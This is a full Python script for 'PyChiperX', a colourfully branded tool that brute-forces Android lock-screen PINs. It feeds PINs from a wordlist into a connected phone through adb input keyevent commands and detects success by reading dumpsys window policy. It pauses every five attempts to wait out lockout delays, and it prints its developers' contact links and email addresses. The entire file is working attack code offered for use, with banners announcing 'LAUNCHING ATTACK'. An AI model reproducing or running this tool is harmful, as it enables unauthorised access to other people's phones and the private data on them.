import subprocess
import time
import random
import os
import sys
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

def clear_screen():
    """Clear the terminal screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    """Print the tool banner."""
    banner = f'''
{Fore.RED}██████╗ ██╗   ██╗{Fore.YELLOW} ██████╗{Fore.GREEN}██╗  ██╗{Fore.BLUE}██╗{Fore.MAGENTA}██████╗ {Fore.CYAN}███████╗{Fore.RED}██████╗ {Fore.YELLOW}██╗  ██╗
{Fore.RED}██╔══██╗╚██╗ ██╔╝{Fore.YELLOW}██╔════╝{Fore.GREEN}██║  ██║{Fore.BLUE}██║{Fore.MAGENTA}██╔══██╗{Fore.CYAN}██╔════╝{Fore.RED}██╔══██╗{Fore.YELLOW}╚██╗██╔╝
{Fore.RED}██████╔╝ ╚████╔╝ {Fore.YELLOW}██║     {Fore.GREEN}███████║{Fore.BLUE}██║{Fore.MAGENTA}██████╔╝{Fore.CYAN}█████╗  {Fore.RED}██████╔╝{Fore.YELLOW} ╚███╔╝ 
{Fore.RED}██╔═══╝   ╚██╔╝  {Fore.YELLOW}██║     {Fore.GREEN}██╔══██║{Fore.BLUE}██║{Fore.MAGENTA}██╔═══╝ {Fore.CYAN}██╔══╝  {Fore.RED}██╔══██╗{Fore.YELLOW} ██╔██╗ 
{Fore.RED}██║        ██║   {Fore.YELLOW}╚██████╗{Fore.GREEN}██║  ██║{Fore.BLUE}██║{Fore.MAGENTA}██║     {Fore.CYAN}███████╗{Fore.RED}██║  ██║{Fore.YELLOW}██╔╝ ██╗
{Fore.RED}╚═╝        ╚═╝   {Fore.YELLOW} ╚═════╝{Fore.GREEN}╚═╝  ╚═╝{Fore.BLUE}╚═╝{Fore.MAGENTA}╚═╝     {Fore.CYAN}╚══════╝{Fore.RED}╚═╝  ╚═╝{Fore.YELLOW}╚═╝  ╚═╝
{Fore.CYAN}════════════════════════════════════════════════════════════════════
{Fore.YELLOW}⚡ PyChiperX - Android PIN Brute Force Tool    {Fore.WHITE}[Version 1.0.0]
{Fore.YELLOW}⚡ Developed By: {Fore.WHITE}@Cyber_Squad6351     {Fore.RED}[ USE AT YOUR OWN RISK ]
{Fore.CYAN}════════════════════════════════════════════════════════════════════
'''
    print(banner)

def print_footer():
    """Print the tool footer with social media links."""
    footer = f'''
{Fore.CYAN}════════════════════════════════════════════════════════════════════
{Fore.YELLOW}📱 CONNECT WITH US:
{Fore.WHITE}• Website  : {Fore.CYAN}https://cybersquad6351.netlify.app/
{Fore.WHITE}• YouTube  : {Fore.RED}https://youtube.com/@cyber_squad6351
{Fore.WHITE}• Instagram: {Fore.MAGENTA}https://www.instagram.com/cyber__squad6351/
{Fore.WHITE}• Email    : {Fore.GREEN}mishraaditya.skm14@gmail.com | cybersquad.3491@gmail.com
{Fore.CYAN}════════════════════════════════════════════════════════════════════
'''
    print(footer)

def print_status(message, color=Fore.WHITE):
    """Print a status message with timestamp."""
    timestamp = time.strftime("%H:%M:%S", time.localtime())
    
    # Create rainbow colors for important messages
    if "SUCCESS" in message or "unlocked" in message:
        rainbow_message = ""
        for i, char in enumerate(message):
            rainbow_color = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA][i % 6]
            rainbow_message += f"{rainbow_color}{char}"
        print(f"{Fore.BLUE}[{timestamp}] {rainbow_message}")
    else:
        print(f"{Fore.BLUE}[{timestamp}] {color}{message}")

def swipe_up():
    """Swipes up on the phone screen."""
    try:
        subprocess.check_output(["adb", "shell", "input", "swipe", "500", "1000", "500", "500"])
        print_status("Swipe up executed successfully.", Fore.GREEN)
    except subprocess.CalledProcessError as e:
        print_status(f"Error swiping up: {e}", Fore.RED)

def type_password(password):
    """Types a password on the lock screen with visual feedback."""
    try:
        sys.stdout.write(f"{Fore.CYAN}[*] Typing PIN: ")
        for i, digit in enumerate(password):
            color = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.BLUE, Fore.MAGENTA, Fore.CYAN][i % 6]
            sys.stdout.write(f"{color}{digit}")
            sys.stdout.flush()
            subprocess.check_output(["adb", "shell", "input", "keyevent", f"KEYCODE_{digit}"])
            time.sleep(0.2)  # Delay between key presses
        sys.stdout.write(f" {Fore.GREEN}[SENT]")
        print()  # New line
        print_status(f"Trying PIN: {Fore.WHITE}{password}", Fore.YELLOW)
    except subprocess.CalledProcessError as e:
        print_status(f"Error typing PIN: {e}", Fore.RED)

def is_device_unlocked():
    """Checks if the device is unlocked by trying to access the home screen."""
    try:
        output = subprocess.check_output(["adb", "shell", "dumpsys", "window", "policy"]).decode()
        if "mShowingLockscreen=false" in output:
            return True
    except subprocess.CalledProcessError:
        pass
    return False

def get_user_inputs():
    """Gets user inputs from the terminal with colorful interactive prompts."""
    print(f"\n{Fore.CYAN}[*] {Fore.MAGENTA}C{Fore.BLUE}o{Fore.GREEN}n{Fore.YELLOW}f{Fore.RED}i{Fore.MAGENTA}g{Fore.BLUE}u{Fore.GREEN}r{Fore.YELLOW}a{Fore.RED}t{Fore.MAGENTA}i{Fore.BLUE}o{Fore.GREEN}n {Fore.YELLOW}S{Fore.RED}e{Fore.MAGENTA}t{Fore.BLUE}t{Fore.GREEN}i{Fore.YELLOW}n{Fore.RED}g{Fore.MAGENTA}s:")
    print(f"{Fore.CYAN}════════════════════════════════════════════════════════════════════")
    
    # Colorful prompt for wordlist
    sys.stdout.write(f"{Fore.MAGENTA}[{Fore.CYAN}+{Fore.MAGENTA}] ")
    sys.stdout.write(f"{Fore.BLUE}E{Fore.CYAN}n{Fore.GREEN}t{Fore.YELLOW}e{Fore.RED}r {Fore.WHITE}the file path of the wordlist: ")
    wordlist_path = input()
    
    # Colorful prompt for attempts
    sys.stdout.write(f"{Fore.MAGENTA}[{Fore.CYAN}+{Fore.MAGENTA}] ")
    sys.stdout.write(f"{Fore.BLUE}E{Fore.CYAN}n{Fore.GREEN}t{Fore.YELLOW}e{Fore.RED}r {Fore.WHITE}the number of attempts before stopping: ")
    try:
        max_attempts = int(input())
        print(f"{Fore.GREEN}[✓] Attempts set to: {Fore.WHITE}{max_attempts}")
    except ValueError:
        max_attempts = 100
        print(f"{Fore.RED}[!] Invalid input. {Fore.YELLOW}Using default value of {Fore.WHITE}100 {Fore.YELLOW}attempts.")
    
    # Colorful prompt for delay
    sys.stdout.write(f"{Fore.MAGENTA}[{Fore.CYAN}+{Fore.MAGENTA}] ")
    sys.stdout.write(f"{Fore.BLUE}E{Fore.CYAN}n{Fore.GREEN}t{Fore.YELLOW}e{Fore.RED}r {Fore.WHITE}the delay time (seconds) between attempts: ")
    try:
        delay_time = int(input())
        print(f"{Fore.GREEN}[✓] Delay set to: {Fore.WHITE}{delay_time} {Fore.GREEN}seconds")
    except ValueError:
        delay_time = 2
        print(f"{Fore.RED}[!] Invalid input. {Fore.YELLOW}Using default value of {Fore.WHITE}2 {Fore.YELLOW}seconds.")
    
    print(f"{Fore.CYAN}════════════════════════════════════════════════════════════════════")
    return wordlist_path, max_attempts, delay_time

def loading_animation(duration=3):
    """Display a colorful loading animation."""
    animation = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    idx = 0
    end_time = time.time() + duration
    
    print(f"{Fore.CYAN}[*] Initializing PyChiperX system", end="")
    while time.time() < end_time:
        color = colors[idx % len(colors)]
        char = animation[idx % len(animation)]
        print(f"\r{Fore.CYAN}[*] Initializing PyChiperX system {color}{char}", end="")
        idx += 1
        time.sleep(0.1)
    print(f"\r{Fore.CYAN}[*] PyChiperX system initialized {Fore.GREEN}successfully! {Fore.YELLOW}✓{' ' * 10}")

def countdown(seconds, message):
    """Display a colorful countdown timer."""
    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    for remaining in range(seconds, 0, -1):
        color = colors[remaining % len(colors)]
        bar_length = 20
        progress = int(bar_length * (seconds - remaining) / seconds)
        bar = '█' * progress + '░' * (bar_length - progress)
        sys.stdout.write(f"\r{Fore.WHITE}{message}: {color}{remaining:2d}s {Fore.WHITE}[{color}{bar}{Fore.WHITE}]")
        sys.stdout.flush()
        time.sleep(1)
    sys.stdout.write("\r" + " " * 70 + "\r")
    sys.stdout.flush()

def unlock_process(wordlist_path, max_attempts, delay_time):
    """Handles the unlocking process with retry mechanism."""
    attempt_count = 0
    
    try:
        with open(wordlist_path, "r") as file:
            passwords = file.read().splitlines()
    except FileNotFoundError:
        print_status("Error: Wordlist file not found.", Fore.RED)
        return
    
    print_status(f"Loaded {len(passwords)} passwords from wordlist", Fore.GREEN)
    print_status("Starting brute force attack...", Fore.YELLOW)
    
    while attempt_count < max_attempts:
        if is_device_unlocked():
            print_status("🔓 SUCCESS! Device is now unlocked!", Fore.GREEN)
            return
        
        for password in passwords:
            if is_device_unlocked():
                print_status("🔓 SUCCESS! Device is now unlocked!", Fore.GREEN)
                return
            
            if attempt_count >= max_attempts:
                print_status("Maximum attempts reached. Stopping.", Fore.RED)
                return
            
            type_password(password)
            countdown(delay_time, "Next attempt in")
            
            attempt_count += 1
            
            if is_device_unlocked():
                print_status(f"🔓 SUCCESS! Device unlocked with PIN: {password}", Fore.GREEN)
                return
            
            if attempt_count % 5 == 0:
                print_status(f"Completed {attempt_count} attempts. Taking a short break...", Fore.YELLOW)
                countdown(30, "Resuming in")
                print_status("Restarting the unlocking process...", Fore.GREEN)
                swipe_up()
    
    print_status("❌ Device was not unlocked within the given attempts.", Fore.RED)
    print_status("Process completed.", Fore.RED)

def check_adb():
    """Check if ADB is installed and available."""
    try:
        subprocess.check_output(["adb", "version"])
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        return False

if __name__ == "__main__":
    try:
        clear_screen()
        print_banner()
        loading_animation()
        
        # Colorful ADB check
        print(f"{Fore.CYAN}[*] {Fore.MAGENTA}C{Fore.BLUE}h{Fore.GREEN}e{Fore.YELLOW}c{Fore.RED}k{Fore.MAGENTA}i{Fore.BLUE}n{Fore.GREEN}g {Fore.YELLOW}A{Fore.RED}D{Fore.MAGENTA}B {Fore.BLUE}s{Fore.GREEN}t{Fore.YELLOW}a{Fore.RED}t{Fore.MAGENTA}u{Fore.BLUE}s{Fore.GREEN}...")
        if not check_adb():
            print_status("⛔ ADB not found! Please install Android Debug Bridge first.", Fore.RED)
            print_status("📥 Download from: https://developer.android.com/studio/releases/platform-tools", Fore.YELLOW)
            print_footer()
            sys.exit(1)
        else:
            print_status("✅ ADB found and ready!", Fore.GREEN)
        
        # Colorful device check
        print(f"{Fore.CYAN}[*] {Fore.BLUE}S{Fore.GREEN}c{Fore.YELLOW}a{Fore.RED}n{Fore.MAGENTA}n{Fore.BLUE}i{Fore.GREEN}n{Fore.YELLOW}g {Fore.RED}f{Fore.MAGENTA}o{Fore.BLUE}r {Fore.GREEN}d{Fore.YELLOW}e{Fore.RED}v{Fore.MAGENTA}i{Fore.BLUE}c{Fore.GREEN}e{Fore.YELLOW}s{Fore.RED}...")
        devices = subprocess.check_output(["adb", "devices"]).decode()
        if "device" not in devices or devices.count("\n") <= 1:
            print_status("⛔ No device detected. Make sure your device is connected and authorized.", Fore.RED)
            print_footer()
            sys.exit(1)
        else:
            device_name = subprocess.check_output(["adb", "shell", "getprop", "ro.product.model"]).decode().strip()
            print_status(f"📱 Device detected: {Fore.CYAN}{device_name}", Fore.GREEN)
        
        # Starting the process with colorful messages
        print_status("🔓 Preparing to unlock device...", Fore.GREEN)
        swipe_up()
        wordlist_path, max_attempts, delay_time = get_user_inputs()
        
        # Cool attack banner
        print(f"\n{Fore.RED}╔{'═' * 60}╗")
        print(f"{Fore.RED}║ {Fore.YELLOW}⚡ {Fore.WHITE}LAUNCHING ATTACK {Fore.YELLOW}⚡{' ' * 41}{Fore.RED}║")
        print(f"{Fore.RED}╚{'═' * 60}╝\n")
        
        print_status("🚀 Starting PyChiperX PIN brute force attack...", Fore.YELLOW)
        countdown(3, "Attack will begin in")
        
        unlock_process(wordlist_path, max_attempts, delay_time)
        print_footer()
        
    except KeyboardInterrupt:
        print("\n")
        print_status("🛑 Operation cancelled by user. Exiting...", Fore.YELLOW)
        print_footer()
    except Exception as e:
        print_status(f"⚠️ An error occurred: {e}", Fore.RED)
        print_footer()
